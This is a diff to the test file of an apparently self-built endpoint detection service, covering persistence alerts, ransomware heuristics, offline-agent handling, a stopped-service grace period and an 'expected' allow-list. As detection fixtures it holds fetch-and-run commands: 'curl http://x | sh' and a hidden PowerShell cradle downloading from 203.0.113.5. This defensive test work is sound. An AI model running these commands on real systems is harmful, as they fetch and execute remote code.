@@ -116,11 +116,37 @@ test('persistence, lateral movement, defense evasion', () => {
     persist({ kind: 'run-key', name: 'Updater', command: 'C:\\Users\\amy\\AppData\\Roaming\\upd.exe' }),
   ]).alerts[0];
   assert.equal(risky.severity, 'high');
+  // A new service from Program Files is ordinary software being installed: no alert. The same
+  // service from a folder any user can write to is reported, and says why.
+  assert.equal(
+    run([
+      persist({
+        kind: 'service',
+        name: 'Zoom Sharing Service',
+        command: 'C:\\Program Files\\Zoom\\bin\\CptService.exe',
+      }),
+    ]).alerts.length,
+    0,
+  );
   const plain = run([
-    persist({ kind: 'service', name: 'Zoom Sharing Service', command: 'C:\\Program Files\\Zoom\\bin\\CptService.exe' }),
+    persist({ kind: 'service', name: 'Sync', command: 'C:\\Users\\amy\\AppData\\Local\\Sync\\svc.exe' }),
   ]).alerts[0];
   assert.equal(plain.severity, 'medium');
   assert.equal(plain.mitre[0].id, 'T1543.003');
+  assert.match(plain.explanation, /outside the protected program folders/);
+  assert.equal(plain.evidence[0].target.autostart.command, 'C:\\Users\\amy\\AppData\\Local\\Sync\\svc.exe');
+  assert.equal(
+    run([
+      persist({
+        kind: 'service',
+        name: 'Sync',
+        command: 'C:\\Users\\amy\\AppData\\Local\\Sync\\svc.exe',
+        signer: { status: 'valid', subject: 'Sync Software Ltd' },
+      }),
+    ]).alerts.length,
+    0,
+    'a validly signed program is not reported',
+  );
   assert.equal(
     run([persist({ kind: 'cron', name: 'x', command: 'curl http://x | sh' })]).alerts[0].mitre[0].id,
     'T1053.003',
@@ -191,10 +217,23 @@ test('ransomware in action: canary, the agent verdict, rename and entropy bursts
     type: 'file.write',
     at: T0 + i * 500,
     host,
-    file: { path: `C:\\d\\f${i}`, entropy: 7.9 },
+    file: { path: `C:\\d\\f${i}.docx`, entropy: 7.9 },
   }));
   assert.deepEqual(rules(writes), ['ransomware-behaviour']);
   assert.deepEqual(rules(writes.map((w) => ({ ...w, file: { ...w.file, entropy: 4.2 } }))), [], 'ordinary documents');
+  assert.deepEqual(
+    rules(writes.map((w, i) => ({ ...w, file: { path: `C:\\d\\.git\\objects\\ab\\${i}`, entropy: 7.9 } }))),
+    [],
+    'compressed data that is not a document (git objects, caches) is not ransomware',
+  );
+  const photos = Array.from({ length: 40 }, (_, i) => ({
+    id: `ph${i}`,
+    type: 'file.rename',
+    at: T0 + i * 500,
+    host,
+    file: { path: `C:\\p\\img${i}.jpg`, oldPath: `C:\\p\\img${i}.jpeg` },
+  }));
+  assert.deepEqual(rules(photos), [], 'renaming photos to another ordinary type');
 });
 
 test('RDP spread, known-malicious hashes, stale agents, allow-list', () => {
@@ -229,16 +268,68 @@ test('RDP spread, known-malicious hashes, stale agents, allow-list', () => {
     'allow-listed hash',
   );
 
-  const stale = staleAgentAlerts(
-    [
-      { id: 'gag_1', hostname: 'LAPTOP', status: 'active', lastSeenAt: T0 - 20 * 60_000 },
-      { id: 'gag_2', hostname: 'NEW', status: 'active', lastSeenAt: T0 - 60_000 },
-    ],
-    { orgId: 'org1', now: T0 },
+  // Silence is only an alert for a machine that should stay on, and never when the agent said
+  // it was shutting down. A PC that is switched off just shows as offline.
+  const quiet = T0 - 20 * 60_000;
+  const fleet = [
+    {
+      id: 'gag_1',
+      hostname: 'LAPTOP',
+      os: 'windows',
+      osVersion: 'Windows 11 Home',
+      status: 'active',
+      lastSeenAt: quiet,
+    },
+    { id: 'gag_2', hostname: 'NEW', os: 'linux', status: 'active', lastSeenAt: T0 - 60_000 },
+    { id: 'gag_3', hostname: 'web-01', os: 'linux', status: 'active', lastSeenAt: quiet },
+    {
+      id: 'gag_4',
+      hostname: 'DC01',
+      os: 'windows',
+      osVersion: 'Windows Server 2022',
+      status: 'active',
+      lastSeenAt: quiet,
+    },
+    { id: 'gag_5', hostname: 'db-01', os: 'linux', status: 'active', lastSeenAt: quiet },
+  ];
+  const stale = staleAgentAlerts(fleet, {
+    orgId: 'org1',
+    now: T0,
+    hosts: { gag_5: { offline: { at: quiet + 400, reason: 'shutdown' } } },
+  });
+  assert.deepEqual(
+    stale.map((a) => a.host.name),
+    ['web-01', 'DC01'],
   );
-  assert.equal(stale.length, 1);
-  assert.equal(stale[0].rule, 'agent-tamper');
+  assert.equal(stale[0].rule, 'agent-offline');
   assert.equal(stale[0].severity, 'medium');
+  assert.deepEqual(stale[0].mitre, [], 'a health notice, not an attack technique');
+  assert.deepEqual(
+    staleAgentAlerts(fleet, { orgId: 'org1', now: T0, expectOnline: { gag_1: true, gag_3: false, gag_4: false } }).map(
+      (a) => a.host.name,
+    ),
+    ['LAPTOP', 'db-01'],
+    'the owner decides per machine',
+  );
+});
+
+test('a stopped Guard service is held, then reported if it stays down or comes back unchanged', () => {
+  const stop = {
+    id: 'st1',
+    type: 'agent.tamper',
+    at: T0,
+    host,
+    detail: { reason: 'the Guard service was stopped on this machine' },
+  };
+  const held = run([stop]);
+  assert.equal(held.alerts.length, 0, 'not an alert yet: a restart looks the same');
+  assert.equal(held.hosts[host.id].pendingStop.at, T0);
+  const uninstall = run([{ ...stop, id: 'st2', detail: { reason: 'the agent is being uninstalled' } }]).alerts[0];
+  assert.equal(uninstall.rule, 'agent-tamper');
+  assert.equal(uninstall.severity, 'high');
+  const said = run([stop, { id: 'st3', type: 'agent.offline', at: T0 + 10, host, detail: { reason: 'shutdown' } }]);
+  assert.equal(said.hosts[host.id].pendingStop, undefined, 'a shutdown notice clears it');
+  assert.equal(said.hosts[host.id].offline.reason, 'shutdown');
 });
 
 test('every endpoint pattern is linear on hostile input', () => {
@@ -836,4 +927,236 @@ test('record stores sort by a column the table has and reject unknown fields bef
   );
   const saved = await edb.guardAgents.save({ ...agents[0], notAColumn: undefined });
   assert.equal(Object.hasOwn(saved, 'notAColumn'), false, 'only mapped fields are stored');
+});
+
+// ---------- accuracy: offline machines, a stopped agent, "this is expected" ----------
+
+const quiet = await signup('endpoint-quiet@example.test');
+let quietToken;
+let quietId;
+const events = (token, list) =>
+  call('/api/endpoint-agent/v1/events', { method: 'POST', token, body: { events: list } });
+const incidentsOf = async (cookie) => (await call('/api/guard/incidents', { cookie })).json.incidents;
+
+test('a PC that goes quiet is offline, not an incident; the owner decides per machine', async () => {
+  const made = await call('/api/guard/endpoints/enroll-token', { method: 'POST', cookie: quiet.cookie });
+  const enrolled = await call('/api/endpoint-agent/v1/enroll', {
+    method: 'POST',
+    body: {
+      token: made.json.token,
+      hostname: 'HOME-PC',
+      os: 'windows',
+      osVersion: 'Windows 11 Home',
+      version: '0.1.2',
+      machineId: 'q-1',
+    },
+  });
+  quietToken = enrolled.json.token;
+  quietId = enrolled.json.agentId;
+  const edb = await import('./packages/dashboard/enterprise-db.mjs');
+  const backdate = async (minutes) => {
+    const agent = await edb.guardAgents.get(quietId);
+    await edb.guardAgents.save({ ...agent, lastSeenAt: Date.now() - minutes * 60_000, tamperAlertedAt: null });
+  };
+  await backdate(45);
+  await runGuardCycles();
+  assert.deepEqual(await incidentsOf(quiet.cookie), [], 'a home PC switched off overnight raises nothing');
+  let view = (await call('/api/guard/endpoints', { cookie: quiet.cookie })).json.agents[0];
+  assert.equal(view.online, false);
+  assert.equal(view.expectOnline, false);
+
+  assert.equal(
+    (
+      await call(`/api/guard/endpoints/${quietId}/expect-online`, {
+        method: 'POST',
+        cookie: quiet.cookie,
+        body: { value: 'yes' },
+      })
+    ).status,
+    400,
+  );
+  assert.equal(
+    (
+      await call(`/api/guard/endpoints/${agentId}/expect-online`, {
+        method: 'POST',
+        cookie: quiet.cookie,
+        body: { value: true },
+      })
+    ).status,
+    404,
+    "another organization's machine",
+  );
+  const set = await call(`/api/guard/endpoints/${quietId}/expect-online`, {
+    method: 'POST',
+    cookie: quiet.cookie,
+    body: { value: true },
+  });
+  assert.equal(set.json.expectOnline, true);
+  await runGuardCycles();
+  const offline = (await incidentsOf(quiet.cookie)).find((i) => i.title.startsWith('Machine stopped reporting'));
+  assert.ok(offline, 'now that it is marked as always on, silence is reported');
+  assert.equal(offline.severity, 'medium');
+  const detail = await call(`/api/guard/incidents/${offline.id}`, { cookie: quiet.cookie });
+  assert.match(detail.json.incident.summary, /Nothing here shows an attack/);
+  assert.doesNotMatch(detail.json.incident.summary, /MITRE/);
+  await call(`/api/guard/incidents/${offline.id}/close`, { method: 'POST', cookie: quiet.cookie, body: {} });
+
+  // Said "shutting down" before going quiet: not reported, and the dashboard says why it is off.
+  await call('/api/endpoint-agent/v1/checkin', { method: 'POST', token: quietToken, body: { version: '0.1.2' } });
+  await events(quietToken, [{ id: 'off1', type: 'agent.offline', at: Date.now(), detail: { reason: 'shutdown' } }]);
+  await backdate(30);
+  const agent = await edb.guardAgents.get(quietId);
+  const record = await edb.guardEndpoint.get(quiet.orgId);
+  record.hosts[quietId].offline.at = agent.lastSeenAt;
+  await edb.guardEndpoint.save(record);
+  await runGuardCycles();
+  assert.equal((await incidentsOf(quiet.cookie)).filter((i) => i.status === 'open').length, 0);
+  view = (await call('/api/guard/endpoints', { cookie: quiet.cookie })).json.agents[0];
+  assert.equal(view.offlineReason, 'shutdown');
+  await call(`/api/guard/endpoints/${quietId}/expect-online`, {
+    method: 'POST',
+    cookie: quiet.cookie,
+    body: { value: false },
+  });
+});
+
+test('a stopped Guard service: silent for an update, reported if it stays down or returns unchanged', async () => {
+  const open = async () => (await incidentsOf(quiet.cookie)).filter((i) => i.status === 'open');
+  const stop = (id, agoMs) => ({
+    id,
+    type: 'agent.tamper',
+    at: Date.now() - agoMs,
+    detail: { reason: 'the Guard service was stopped on this machine' },
+  });
+  const checkin = (body) => call('/api/endpoint-agent/v1/checkin', { method: 'POST', token: quietToken, body });
+
+  // 1. Stopped, then back with a newer version: an update. Nothing is raised.
+  await checkin({ version: '0.1.2' });
+  assert.equal((await events(quietToken, [stop('s1', 20_000)])).json.alerts, 0);
+  await checkin({ version: '0.1.2', startedAt: Date.now() - 60_000 });
+  await runGuardCycles();
+  assert.equal((await open()).length, 0, 'the stopping process still talking is not "back"');
+  await checkin({ version: '0.1.3', startedAt: Date.now() - 5000 });
+  await runGuardCycles();
+  assert.equal((await open()).length, 0, 'came back as a new version');
+
+  // 2. Stopped and started again, same version: someone switched Guard off for a while.
+  await events(quietToken, [stop('s2', 40_000)]);
+  await checkin({ version: '0.1.3', startedAt: Date.now() - 2000 });
+  let incidents = await open();
+  assert.equal(incidents.length, 1);
+  assert.equal(incidents[0].severity, 'medium');
+  let detail = await call(`/api/guard/incidents/${incidents[0].id}`, { cookie: quiet.cookie });
+  assert.match(detail.json.incident.summary, /stopped for \d+ seconds and then started again/);
+  await call(`/api/guard/incidents/${incidents[0].id}/close`, { method: 'POST', cookie: quiet.cookie, body: {} });
+
+  // 3. Stopped and still down after the grace period.
+  await events(quietToken, [stop('s3', 5 * 60_000)]);
+  await runGuardCycles();
+  incidents = await open();
+  assert.equal(incidents.length, 1);
+  assert.equal(incidents[0].severity, 'high');
+  detail = await call(`/api/guard/incidents/${incidents[0].id}`, { cookie: quiet.cookie });
+  assert.match(detail.json.incident.summary, /has not started again/);
+  await runGuardCycles();
+  await checkin({ version: '0.1.3', startedAt: Date.now() - 1000 });
+  assert.equal((await open()).length, 1, 'reported once, not again when it returns');
+  await call(`/api/guard/incidents/${incidents[0].id}/close`, { method: 'POST', cookie: quiet.cookie, body: {} });
+
+  // 4. Stopped, then installed again (a new credential): the reinstall explains it.
+  await events(quietToken, [stop('s4', 30_000)]);
+  const made = await call('/api/guard/endpoints/enroll-token', { method: 'POST', cookie: quiet.cookie });
+  const again = await call('/api/endpoint-agent/v1/enroll', {
+    method: 'POST',
+    body: {
+      token: made.json.token,
+      hostname: 'HOME-PC',
+      os: 'windows',
+      osVersion: 'Windows 11 Home',
+      version: '0.1.3',
+      machineId: 'q-1',
+    },
+  });
+  assert.equal(again.json.agentId, quietId);
+  quietToken = again.json.token;
+  await checkin({ version: '0.1.3', startedAt: Date.now() });
+  await runGuardCycles();
+  assert.equal((await open()).length, 0);
+});
+
+test('"This is expected" silences one exact file everywhere, can be undone, and never hides a critical alert', async () => {
+  const launcher = (id) => ({
+    id,
+    type: 'persistence.created',
+    at: Date.now() - 1000,
+    persistence: {
+      kind: 'scheduled-task',
+      name: '\\LocalAgent',
+      command: 'wscript.exe //B //Nologo "C:\\Users\\amy\\AppData\\Roaming\\LocalAgent\\bin\\launcher.vbs"',
+    },
+  });
+  const cradle = (id) => ({
+    id,
+    type: 'process.start',
+    at: Date.now() - 900,
+    process: { pid: 77, name: 'powershell.exe', cmdline: 'powershell -w hidden -c "iex(irm http://203.0.113.5/a)"' },
+  });
+  assert.equal((await events(quietToken, [launcher('x1'), cradle('x2')])).json.alerts, 2);
+  const incident = (await incidentsOf(quiet.cookie)).find((i) => i.status === 'open');
+  const detail = await call(`/api/guard/incidents/${incident.id}`, { cookie: quiet.cookie });
+  assert.equal(detail.json.canManage, true);
+  const autostart = detail.json.incident.alerts.find((a) => a.rule === 'persistence-created');
+  const critical = detail.json.incident.alerts.find((a) => a.rule === 'encoded-powershell');
+  assert.match(autostart.trust.label, /launcher\.vbs$/i);
+  assert.equal(critical.severity, 'critical');
+  assert.equal(critical.trust, undefined);
+
+  const mark = (cookie, alertId, incidentId = incident.id) =>
+    call('/api/guard/endpoints/expected', { method: 'POST', cookie, body: { incidentId, alertId } });
+  assert.equal((await mark(owner.cookie, autostart.id)).status, 404, "another organization's incident");
+  assert.equal((await mark(quiet.cookie, critical.id)).status, 400, 'a critical alert cannot be marked as expected');
+  const marked = await mark(quiet.cookie, autostart.id);
+  assert.equal(marked.status, 200, JSON.stringify(marked.json));
+  assert.deepEqual({ removed: marked.json.removed, closed: marked.json.closed }, { removed: 1, closed: 0 });
+  const after = await call(`/api/guard/incidents/${incident.id}`, { cookie: quiet.cookie });
+  assert.deepEqual(
+    after.json.incident.alerts.map((a) => a.rule),
+    ['encoded-powershell'],
+    'the attack is still there',
+  );
+  assert.equal(after.json.incident.severity, 'critical');
+
+  assert.equal((await events(quietToken, [launcher('x3')])).json.alerts, 0, 'no longer reported');
+  const overview = await call('/api/guard/endpoints', { cookie: quiet.cookie });
+  assert.equal(overview.json.expected.length, 1);
+  assert.equal(overview.json.expected[0].by, 'endpoint-quiet@example.test');
+  assert.equal((await call('/api/guard/endpoints', { cookie: owner.cookie })).json.expected.length, 0);
+
+  const fp = overview.json.expected[0].fp;
+  assert.equal(
+    (await call(`/api/guard/endpoints/expected/${encodeURIComponent(fp)}`, { method: 'DELETE', cookie: quiet.cookie }))
+      .json.removed,
+    true,
+  );
+  assert.equal(
+    (await events(quietToken, [launcher('x4')])).json.alerts,
+    1,
+    'reported again once it is removed from the list',
+  );
+
+  // An incident made only of expected alerts is closed, with a note saying why.
+  await call(`/api/guard/incidents/${incident.id}/close`, { method: 'POST', cookie: quiet.cookie, body: {} });
+  await events(quietToken, [
+    {
+      ...launcher('x5'),
+      persistence: { kind: 'run-key', name: 'Notes', command: 'C:\\Users\\amy\\AppData\\Local\\Notes\\notes.exe' },
+    },
+  ]);
+  const lone = (await incidentsOf(quiet.cookie)).find((i) => i.status === 'open');
+  const loneAlert = (await call(`/api/guard/incidents/${lone.id}`, { cookie: quiet.cookie })).json.incident.alerts[0];
+  const closed = await mark(quiet.cookie, loneAlert.id, lone.id);
+  assert.deepEqual({ removed: closed.json.removed, closed: closed.json.closed }, { removed: 1, closed: 1 });
+  const done = (await call(`/api/guard/incidents/${lone.id}`, { cookie: quiet.cookie })).json.incident;
+  assert.equal(done.status, 'closed');
+  assert.match(done.closeNote, /marked as expected/);
 });
